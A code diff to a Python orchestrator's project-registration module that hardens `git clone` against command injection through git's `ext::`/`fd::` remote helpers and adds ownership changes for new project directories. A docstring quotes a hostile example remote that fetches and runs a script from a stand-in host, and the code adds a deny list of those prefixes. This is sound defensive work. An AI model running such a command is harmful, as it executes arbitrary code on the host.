@@ -8,11 +8,16 @@ committed -- this is how a caller wires in "start the intake graph"
 The real wiring lives in `services.orchestrator.registry.cli`.
 """
 
+import os
 import subprocess
 from pathlib import Path
 from typing import Callable
 
-from services.orchestrator.memory.project_memory import MEMORY_FILENAMES, project_memory_dir
+from services.orchestrator.memory.project_memory import (
+    MEMORY_FILENAMES,
+    chown_to_workspace_uid,
+    project_memory_dir,
+)
 from services.orchestrator.registry.errors import BrownfieldSourceError, DuplicateProjectIdError
 from services.orchestrator.registry.schemas import (
     DEFAULT_COVERAGE_GATE_MODE,
@@ -70,6 +75,7 @@ def register_greenfield(
 
     project_dir = projects_root / project_id
     project_dir.mkdir(parents=True, exist_ok=True)
+    chown_to_workspace_uid(project_dir)
     _create_empty_memory_files(projects_root, project_id)
 
     record = ProjectRecord(
@@ -138,7 +144,13 @@ def register_brownfield_from_local_path(
 
     project_dir = projects_root / project_id
     projects_root.mkdir(parents=True, exist_ok=True)
-    project_dir.symlink_to(source_path.resolve(), target_is_directory=True)
+    try:
+        project_dir.symlink_to(source_path.resolve(), target_is_directory=True)
+    except OSError as exc:
+        raise BrownfieldSourceError(
+            f"could not link {source_path} in as {project_dir}: {exc}"
+        ) from exc
+    chown_to_workspace_uid(project_dir)
     _create_empty_memory_files(projects_root, project_id)
 
     record = ProjectRecord(
@@ -195,23 +207,28 @@ def register_brownfield_from_git(
     Raises:
         InvalidProjectIdError: If project_id isn't a safe slug.
         DuplicateProjectIdError: If project_id is already registered.
-        BrownfieldSourceError: If `git clone` fails.
+        BrownfieldSourceError: If `git_remote` uses a disallowed transport
+            (e.g. git's `ext::`/`fd::` remote helpers, which can run an
+            arbitrary command) or if `git clone` fails.
     """
     records = _ensure_registrable(registry_path, project_id)
+    _validate_git_remote(git_remote)
 
     project_dir = projects_root / project_id
     projects_root.mkdir(parents=True, exist_ok=True)
     try:
         subprocess.run(
-            ["git", "clone", "--quiet", git_remote, str(project_dir)],
+            ["git", "clone", "--quiet", "--", git_remote, str(project_dir)],
             check=True,
             capture_output=True,
             text=True,
+            env={**os.environ, "GIT_ALLOW_PROTOCOL": "http:https:git:ssh:file"},
         )
     except subprocess.CalledProcessError as exc:
         raise BrownfieldSourceError(
             f"git clone of {git_remote!r} failed: {exc.stderr.strip()}"
         ) from exc
+    chown_to_workspace_uid(project_dir)
     _create_empty_memory_files(projects_root, project_id)
 
     record = ProjectRecord(
@@ -227,6 +244,36 @@ def register_brownfield_from_git(
         cost_ceiling_usd_weekly=cost_ceiling_usd_weekly,
     )
     return _finalize_registration(registry_path, records, record, on_registered)
+
+
+_DISALLOWED_GIT_REMOTE_PREFIXES = ("ext::", "fd::")
+
+
+def _validate_git_remote(git_remote: str) -> None:
+    """Rejects a `git_remote` that would let `git clone` run an arbitrary command.
+
+    Git's `ext::<command>` and `fd::<fd>` remote helpers execute `<command>`
+    (or talk to an already-open file descriptor) instead of fetching over a
+    network transport -- `git clone 'ext::sh -c "curl evil.sh|sh"'` runs that
+    shell command as whichever user invoked `new-project`. The `git clone`
+    subprocess call also sets `GIT_ALLOW_PROTOCOL` to an explicit allowlist
+    as the primary defense; this is a cheap, explicit second check so the
+    dangerous prefixes are rejected with a clear error before a subprocess
+    is ever spawned, rather than relying solely on git's own enforcement of
+    that environment variable.
+
+    Args:
+        git_remote: The caller-supplied remote URL or local path.
+
+    Raises:
+        BrownfieldSourceError: If git_remote starts with a disallowed
+            remote-helper prefix.
+    """
+    lowered = git_remote.strip().lower()
+    if lowered.startswith(_DISALLOWED_GIT_REMOTE_PREFIXES):
+        raise BrownfieldSourceError(
+            f"git_remote {git_remote!r} uses a disallowed transport"
+        )
 
 
 def _ensure_registrable(registry_path: Path, project_id: str) -> list[ProjectRecord]:
